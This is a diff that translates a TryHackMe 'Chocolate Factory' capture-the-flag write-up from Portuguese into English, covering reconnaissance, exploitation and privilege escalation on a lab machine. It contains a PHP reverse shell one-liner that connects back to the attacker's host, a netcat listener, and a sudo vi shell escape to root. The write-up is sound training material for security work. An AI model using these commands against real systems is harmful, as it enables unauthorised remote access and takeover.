@@ -1,38 +1,35 @@
-> [!WARNING]
-> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).
-
 # [Chocolate Factory](https://tryhackme.com/room/chocolatefactory)
 
 <a href="https://tryhackme.com/room/chocolatefactory"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
 
 > A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!
 
-Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/chocolatefactory), feito por [0x9747](https://tryhackme.com/p/0x9747), [saharshtapi](https://tryhackme.com/p/saharshtapi) e [AndyInfoSec](https://tryhackme.com/p/AndyInfoSec).
+Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/chocolatefactory), made by [0x9747](https://tryhackme.com/p/0x9747), [saharshtapi](https://tryhackme.com/p/saharshtapi) and [AndyInfoSec](https://tryhackme.com/p/AndyInfoSec).
 
-Dificuldade: `Fácil`
+Dificulty: `Easy`
 
-Resolvido em: `2026/04/20`
+Solved in: `2026/04/20`
 
-# Conteúdos
+# Table of Contents
 
 - [Chocolate Factory](#chocolate-factory)
-- [Conteúdos](#conteúdos)
+- [Table of Contents](#table-of-contents)
 - [Writeup](#writeup)
-   * [Sumário](#sumário)
-   * [Reconhecimento](#reconhecimento)
-   * [Exploração](#exploração)
-   * [Escalação de Privilégios](#escalação-de-privilégios)
-   * [Notas finais](#notas-finais)
+   * [Summary](#summary)
+   * [Reconnaissance](#reconnaissance)
+   * [Exploration](#exploration)
+   * [Privilege Escalation](#privilege-escalation)
+   * [Final Considerations](#final-considerations)
 
 # Writeup
 
-## Sumário
+## Summary
 
-Usando informações escondidas em binários, é possível invadir a fábrica de chocolate e obter suas chaves.
+Using hidden information within binaries, it is possible to invade the chocolate factory and get its keys.
 
-## Reconhecimento
+## Reconnaissance
 
-Antes de começar o reconhecimento e após iniciar a máquina, eu adicionei o endereço `cf.net` ao arquivo `/ect/hosts` para facilitar o acesso do endereço da máquina. Para verificar se tudo funcionou:
+Before starting everything (and after starting the machine) I added `cf.net` to the file `/etc/hosts` for easier access of the machine's IP. To see if all is right:
 
 ```bash
 $ ping -c 3 cf.net
@@ -46,7 +43,7 @@ PING cf.net (<MACHINE_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 223.630/419.378/659.769/180.829 ms
 ```
 
-Com isso, prossegui aos procedimentos padrões. Isto é, já que possuo apenas um endereço, a primeira coisa a se fazer é verificar portas abertas usando `nmap`:[^nmap]
+With that, I followed the default procedures. That is, since I only got an address, the first thinf to do is seeing which available ports are around with `nmap`:[^nmap]
 
 ```bash
 $ nmap -T4 cf.net
@@ -70,11 +67,11 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 3.48 seconds
 ```
 
-Opa! Diversas portas abertas... Decidi começar simples, checando o `http`.
+Woah! That's a ton! I decided to go simple with `http`...
 
 <figure><img src="./assets/squirrel.png" title="index.html"></figure>
 
-Uma página de login, com usuário e senha. Bem, decidi usar o `gobuster`[^gobuster] com uma das wordlists padrões do kali[^wl-dirl23med] para verificar se existia outras páginas relevantes:
+Just a login page, with user and password fields. Well, from there I used `gobuster`[^gobuster] with one of the default kali wordlists[^wl-dirl23med] to verify if other pages existed:
 
 ```bash
 $ gobuster dir -u cf.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -87,11 +84,11 @@ Starting gobuster in directory enumeration mode
 /validate.php         (Status: 200) [Size: 93]
 ```
 
-Encontrei `/index.html` (a página de login), `/home.php` e `/validate.php`. Enquanto `/validate.php` é apenas o script que roda ao submeter o formulário em `/index.html`, `/home.php` parecia-me muito mais promissor:
+That gave me `./index.html` (the login page), `/home.php` and `/validate.php`. While `/validate.php` is just the script for submitting the form in `/index.html`, `/home.php` proved far more interesting:
 
 <figure><img src="./assets/terminal.png" title="home.php"></figure>
 
-Um terminal! De imediato já comecei a bisbilhotar com alguns comandos...
+A commandline! Immediately I started to throw in some commands...
 
 ```bash
 $ whoami
@@ -101,27 +98,27 @@ $ ls
 home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
 ```
 
-Quando tentei usar `cd ..` descobri que o terminal entra em timeout se o comando não resulta em um output. Tive de reiniciar a máquina por completo para restaurar o sistema! Mas realizar algo como `cd .. ; echo "a"` garante que exista um output.
+Though, when I used `cd ..` I discovered the terminal enters timeout if no answer is given from a command. I had to restart the whole machine because of it! Though doing something like `cd .. ; echo "a"` is enough a bypass for this.
 
-Dito isso, o terminal se provou extremamente restritivo, então decidi montar um reverse shell[^rv] aqui.
+That said, since the environment is so extremely restrictive, I decided to make a reverse shell.[^rv]
 
-## Exploração
+## Exploration
 
-Construir um revshell[^rv] foi um processo de tentativa e erro. Tentei vários modelos disponíveis em [revshells.com](https://www.revshells.com/) para `bash` mas não funcionaram. A alternativa restante era, então, usar `php`, considerando que o servidor possuia códigos de `php` (`/validate.php`).
+Making a revshell[^rv] here was a trial and error endeavor. I tried many a models for `bash` available at [revshells.com](https://www.revshells.com/) though none worked. The alternative was, then, `php`, since the server had it installed (`/validate.php`).
 
-Então, com o `netcat`[^nc] ouvindo em minha máquina:
+So, with `netcat`[^nc] set on my machine:
 
 ```bash
 $ nc -lvnp 1234
 ```
 
-Enviei o comando para o servidor:
+I sent the command to the server:
 
 ```bash
 $ php -r '$sock=fsockopen("<MY_MACHINE>",1234);exec("sh <&3 >&3 2>&3");'
 ```
 
-Bingo! Revshell ativado. Agora, com mais liberdade de controle, decidi olhar os arquivos mais profundamente. Notavelmente, o executável `key_rev_key` possuia algo. Separando as strings do binário, obtive:
+Bingo! Revshell acquired. Now, with more liberty, I tried exploring deeper. First on the line, the executable `key_rev_key` had something. Separating the strings from the binary:
 
 ```bash
 $ strings validate.php
@@ -139,10 +136,10 @@ GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
 ...
 ```
 
-Com isso, completei a primeira tarefa.
+That answers the first task.
 - Q: Enter the key you found! A: b'<FLAG_1>'
 
-Ainda nesse diretório, pude fazer o mesmo com `validate.php` e obter outra bandeira:
+Still within this directory, I did the same with `validate.php` and learned of charlie's password.
 
 ```bash
 $ strings validate.php
@@ -158,7 +155,7 @@ $ strings validate.php
 
 - Q: What is Charlie's password? A: <FLAG_2>
 
-Ótimo! Com isso, descobri as credenciais da página de login! Infelizmente, como é possível de ver no código, as credenciais apenas me levariam de volta para `/home.php`. Então, voltei à exploração.
+Great! Now, I could access the login at `/index.html`! Unfortunately, as we can see in the code, it only really takes us back to `/home.php`. So back to exploring it is.
 
 ```bash
 $ pwd
@@ -169,7 +166,7 @@ teleport.pub
 user.txt
 ```
 
-Eu me animei muito e acabei ignorando `user.txt` ao ver dois arquivos de chave. `teleport` é a chave privada e `teleport.pub` a chave pública, o que significa que elas provavelmente davam acesso à porta `ssh`!
+I did get quite excited here and ended up ignoring `user.txt` in favor of the RSA keys. `teleport` is the private key, while `teleport.pub` the public one, which probably means they grant access to the `ssh` port!
 
 ```bash
 $ cat teleport
@@ -181,7 +178,7 @@ $ cat teleport.pub
 ssh-rsa ... charlie@chocolate-factory
 ```
 
-Com os arquivos recriados localmente, eu uso outro terminal para fazer o login no `ssh`:
+With the files locally saved, I used another terminal to login on `ssh`:
 
 ```bash
 $ ssh -i teleport charlie@cf.net
@@ -192,7 +189,7 @@ charlie
 
 - C: change user to charlie
 
-Ótimo! Com acesso direto à máquina, eu finalmente abro o arquivo `user.txt`:
+Great! With direct access to the machine, I finally open `user.txt`:
 
 ```bash
 charlie@ip-<MACHINE_IP>:/home/charlie$ cat user.txt
@@ -201,9 +198,9 @@ charlie@ip-<MACHINE_IP>:/home/charlie$ cat user.txt
 
 - Q: Enter the user flag. A: <FLAG_USER>
 
-## Escalação de Privilégios
+## Privilege Escalation
 
-Para realizar a escalação de privilégios, sempre gosto de começar com `sudo -l`:
+To start off, I usually like doing `sudo -l` to check for permissions:
 
 ```bash
 charlie@ip-<MACHINE_IP>:/$ sudo -l
@@ -215,7 +212,7 @@ User charlie may run the following commands on ip-<MACHINE_IP>:
     (ALL : !root) NOPASSWD: /usr/bin/vi
 ```
 
-Já que `/usr/bin/vi` está com privilégios sem senha, basta usar um dos diversos disponíveis comandos em [GTFObins](https://gtfobins.org/) para remover as restrições:
+Since `/usr/bin/vi` is with passwordless privileges, just need to use one of the many available commands in [GTFObins](https://gtfobins.org/) to remove the restrictions:
 
 ```bash
 charlie@ip-<MACHINE_IP>:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
@@ -223,7 +220,7 @@ charlie@ip-<MACHINE_IP>:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
 root
 ```
 
-Com isso basta garatir a última bandeira...
+Alas, now we find the root flag...
 
 ```bash
 # pwd
@@ -245,27 +242,25 @@ print(display2)
 print(mess)
 ```
 
-E tem uma cifra por cima da última flag. Como a máquina não tinha python instalado, decidi usar [CyberChef](https://gchq.github.io/CyberChef/) para decifrar:
+And unfortunately it looks like it is cyphered above another layer. Since the machine didn't have python for running this code, I decided to use [CyberChef](https://gchq.github.io/CyberChef/) instead:
 
 <figure><img src="./assets/flag3.png" title="CyberChef"></figure>
 
-Basta definir a cifra como Fernet, usar a chave encontrada no início da máquina e o texto cifrado presente em `root.py`.
+Just set the cypher as Fernet, use the key found back at the start of the machine and the cyphered text within `root.py`.
 
 - Q: Enter the root flag A: <FLAG_ROOT>
 
+## Final Considerations
 
-## Notas finais
-
-Na página da máquina no Try Hack Me existe um tiquete dourado com nome `01869e0b2238d8307020d2c4503cec51.jpg`, assemelhando a um hash MD4 ou MD5.
+At the machine's task page in Try Hack Me there's a golden ticket with a hash-like name (probably MD4 or MD5): `01869e0b2238d8307020d2c4503cec51.jpg`.
 
 <figure><img src="./assets/01869e0b2238d8307020d2c4503cec51.jpg" title="Golden ticket"></figure>
 
-Durante a exploração, eu tentei entrar na porta `ftp` e encontrei apenas uma imagem:
+Also, while exploring, I did enter the `ftp` port and only found this image:
 
 <figure><img src="./assets/gum_room.jpg" title="Gum room"></figure>
 
-Apesar de não terem sido utilizados, esses arquivos e as diversas portas abertas leva-me a acreditar que existe outra solução para essa máquina.
-
+These and the many open ports lead me to believe there is a second solution to this machine.
 
 [^nmap]: https://github.com/nmap/nmap
 [^gobuster]: https://github.com/OJ/gobuster
